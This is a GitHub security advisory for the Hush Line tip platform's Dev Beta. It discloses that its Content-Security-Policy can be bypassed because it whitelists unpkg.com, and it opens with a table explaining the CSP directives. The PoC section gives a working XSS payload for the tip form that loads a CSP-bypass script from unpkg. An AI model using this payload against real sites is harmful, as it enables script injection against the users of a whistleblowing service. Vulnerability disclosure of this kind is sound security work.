|  |  | The Content-Security-Policy (CSP) header is a powerful tool used by web applications to mitigate the risk of Cross-Site Scripting (XSS) attacks and other types of code injection attacks. By specifying which content sources are trustworthy, CSP prevents the browser from loading malicious assets. Here's a breakdown of the CSP directive used: |
|  |  |  |
|  |  | - `default-src 'self';` Only allow content from the site's own origin. This is the default policy for loading resources such as JavaScript, images, CSS, fonts, AJAX requests, frames, HTML5 media, and other data. |
|  |  | - `script-src 'self' https://js.stripe.com https://unpkg.com;` Allow scripts to be loaded from the site's own origin, Stripe (for payment processing), and unpkg (a content delivery network for npm packages). |
|  |  | - `script-src 'self' https://js.stripe.com;` Allow scripts to be loaded from the site's own origin and Stripe (for payment processing). |
|  |  | - `img-src 'self' data: https:;` Allow images from the site's origin, inline images using data URIs, and images loaded over HTTPS from any origin. |
|  |  | - `style-src 'self';` Only allow stylesheets from the site's own origin. |
|  |  | - `frame-ancestors 'none';` Prevent the site from being framed (embedded within an <iframe>) by other sites, mitigating Clickjacking attacks. |

# [Dev Beta] CSP bypass

Moderate

[glenn-sorrentino](/glenn-sorrentino)
published
GHSA-r85c-95x7-4h7q
Jun 25, 2024

## Package

Hush Line

## Affected versions

Dev Beta

## Patched versions

Dev Beta

## Description

### Summary

The CSP policy applied on the `tips.hushline.app` website and bundled by default in this repository is trivial to bypass.

### Details

Having whitelisted a source that allows for user-uploaded package is like not having a policy at all.

```
script-src 'self' https://js.stripe.com https://unpkg.com;

```

In unpkg.com words:

> unpkg is a fast, global content delivery network for everything on [npm](https://www.npmjs.com/). Use it to quickly and easily load any file from any package using a URL like:

Chained with [the persistent XSS reported together](https://github.com/scidsg/hushline/security/advisories/GHSA-4v8c-r6h2-fhh3) this allows an attacker with HTML injection capabilities full JavaScript execution.

### PoC

To demo, just submit in the tip submission form:

```
"><script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp="alert(1)">

```

(as mentioned in the other issue, even if encryption is on it is trivial to bypass)

### Impact

The CSP is fully bypassed.

Note: I tried to report this as suggested in Security.md via the scidsg tipline. Received no reply in ~5 days. [It is also quite unsettling that someone has specifically audited the CSP and stated "All versions of Hush Line also implemented a hardened Content Security Policy (CSP)."](https://github.com/scidsg/project-info/blob/main/hush-line/1.%20Audits/Security/2024-subgraph-findings.pdf).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
